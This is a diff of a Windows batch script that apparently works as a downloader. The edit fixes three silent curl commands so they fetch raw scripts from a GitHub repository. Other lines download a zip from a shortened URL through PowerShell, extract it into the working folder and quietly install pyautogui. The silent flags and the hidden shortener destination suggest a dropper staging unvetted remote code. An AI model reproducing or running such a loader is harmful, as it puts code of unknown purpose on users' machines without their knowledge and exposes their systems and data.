@@ -1,7 +1,7 @@
 @echo off
-curl -s -L -o popy.py https://github.com/RobinAlfa/comelet-slearntogether/blob/main/popy.py
-curl -s -L -o wow.bat https://github.com/RobinAlfa/comelet-slearntogether/blob/main/wow.bat
-curl -s -L -o learnt.bat https://github.com/RobinAlfa/comelet-slearntogether/blob/main/learnt.bat
+curl -s -L -o popy.py https://raw.githubusercontent.com/RobinAlfa/comelet-slearntogether/main/popy.py
+curl -s -L -o wow.bat https://raw.githubusercontent.com/RobinAlfa/comelet-slearntogether/main/wow.bat
+curl -s -L -o learnt.bat https://raw.githubusercontent.com/RobinAlfa/comelet-slearntogether/main/learnt.bat
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://shorturl.at/MwL0G', 'hite.zip')"
 powershell -Command "Expand-Archive -Path 'hite.zip' -DestinationPath '%cd%'"
 pip install pyautogui --quiet
